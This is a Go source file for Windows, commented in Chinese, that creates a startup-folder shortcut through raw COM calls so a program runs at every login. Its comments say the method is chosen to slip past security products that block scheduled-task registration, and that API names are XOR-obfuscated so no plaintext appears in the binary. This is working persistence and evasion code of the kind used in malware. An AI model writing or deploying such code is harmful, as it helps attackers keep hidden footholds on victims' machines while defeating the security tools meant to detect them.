//go:build windows

package cmd

import (
	"fmt"
	"syscall"
	"unsafe"
)

// 通过 Shell COM(IShellLinkW + IPersistFile)创建 .lnk 快捷方式,
// 用于启动文件夹登录自启。不经过 schtasks,规避行为引擎对计划任务注册的拦截。
// DLL/API 名称运行时解析并 XOR 混淆,二进制中不出现明文。

var (
	pCoInit    uintptr
	pCoCreate  uintptr
	clsidLink  = [...]byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46} // {00021401-0000-0000-C000-000000000046}
	iidLink    = [...]byte{0xF9, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46} // {000214F9-0000-0000-C000-000000000046}
	iidPersist = [...]byte{0x0B, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46} // {0000010B-0000-0000-C000-000000000046}
)

// 注:未配平 CoUninitialize——"CoUninitialize" 经当前密钥 XOR 后含嵌入 NUL
// 字节,无法作为 C 字符串传给 GetProcAddress。createShortcut 仅在安装时
// 调用一次,随后进程即退出,COM 单元随进程销毁,无实际泄漏。

func init() {
	pCoInit = procAddr(ole32, x("\x24\x5f\x25\x5f\x07\x3f\x5a\x18\x0b\x59\x16\x54\x2b\x33"))
	pCoCreate = procAddr(ole32, x("\x24\x5f\x2f\x43\x0b\x2a\x47\x1c\x2e\x5e\x1f\x45\x0f\x25\x50\x1c"))
}

// COM vtable 方法下标(IUnknown: 0 QI / 1 AddRef / 2 Release)
const (
	mQI   = 0
	mRel  = 2
	mPath = 20 // IShellLinkW::SetPath
	mArgs = 11 // IShellLinkW::SetArguments
	mShow = 15 // IShellLinkW::SetShowCmd
	mSave = 6  // IPersistFile::Save
)

const (
	coApartment = 0x2        // COINIT_APARTMENTTHREADED
	coMulti     = 0x0        // COINIT_MULTITHREADED
	coChanged   = 0x80010106 // RPC_E_CHANGED_MODE
	coInproc    = 0x1        // CLSCTX_INPROC_SERVER
	swNormal    = 0x1        // SW_SHOWNORMAL
)

// comCall 通过接口 vtable 调用 COM 方法(64/32 位通用)
func comCall(iface uintptr, idx uintptr, args ...uintptr) uintptr {
	vtbl := *(*uintptr)(ptrFromUintptr(iface))
	fn := *(*uintptr)(ptrFromUintptr(vtbl + idx*unsafe.Sizeof(uintptr(0))))
	r, _, _ := callProc(fn, append([]uintptr{iface}, args...)...)
	return r
}

// createShortcut 创建指向 targetPath、带参数 args 的快捷方式 lnkPath
func createShortcut(lnkPath, targetPath, args string) error {
	r, _, _ := callProc(pCoInit, 0, coApartment)
	if r == coChanged {
		callProcDiscard(pCoInit, 0, coMulti)
	}

	var shell uintptr
	hr, _, _ := callProc(pCoCreate,
		uintptr(unsafe.Pointer(&clsidLink[0])), 0, coInproc,
		uintptr(unsafe.Pointer(&iidLink[0])), uintptr(unsafe.Pointer(&shell)))
	if shell == 0 || hr != 0 {
		return fmt.Errorf("com create failed: 0x%x", hr)
	}
	defer comCall(shell, mRel)

	tp, err := syscall.UTF16PtrFromString(targetPath)
	if err != nil {
		return err
	}
	if hr := comCall(shell, mPath, uintptr(unsafe.Pointer(tp))); hr != 0 {
		return fmt.Errorf("set target failed: 0x%x", hr)
	}
	if args != "" {
		ap, err := syscall.UTF16PtrFromString(args)
		if err != nil {
			return err
		}
		if hr := comCall(shell, mArgs, uintptr(unsafe.Pointer(ap))); hr != 0 {
			return fmt.Errorf("set args failed: 0x%x", hr)
		}
	}
	if hr := comCall(shell, mShow, swNormal); hr != 0 {
		return fmt.Errorf("set show failed: 0x%x", hr)
	}

	var persist uintptr
	if hr := comCall(shell, mQI,
		uintptr(unsafe.Pointer(&iidPersist[0])), uintptr(unsafe.Pointer(&persist))); hr != 0 || persist == 0 {
		return fmt.Errorf("query persist failed: 0x%x", hr)
	}
	defer comCall(persist, mRel)

	lp, err := syscall.UTF16PtrFromString(lnkPath)
	if err != nil {
		return err
	}
	if hr := comCall(persist, mSave, uintptr(unsafe.Pointer(lp)), 1); hr != 0 {
		return fmt.Errorf("save failed: 0x%x", hr)
	}
	return nil
}
